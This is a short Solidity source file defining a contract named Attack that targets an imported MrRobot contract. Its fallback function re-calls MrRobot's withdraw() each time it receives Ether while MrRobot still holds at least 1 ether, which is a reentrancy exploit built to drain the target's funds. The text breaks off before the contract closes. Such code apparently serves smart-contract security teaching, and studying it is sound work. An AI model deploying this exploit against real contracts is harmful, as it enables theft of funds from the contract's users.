// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./MrRobot.sol";


contract Attack {
    MrRobot public mrrobot;

    constructor(address _mrrobotAddress) {
        mrrobot = MrRobot(_mrrobotAddress);
    }

    // Fallback is called when MrRobot sends Ether to this contract.
    fallback() external payable {
        if (address(mrrobot).balance >= 1 ether) {
            mrrobot.withdraw();
        }
    }
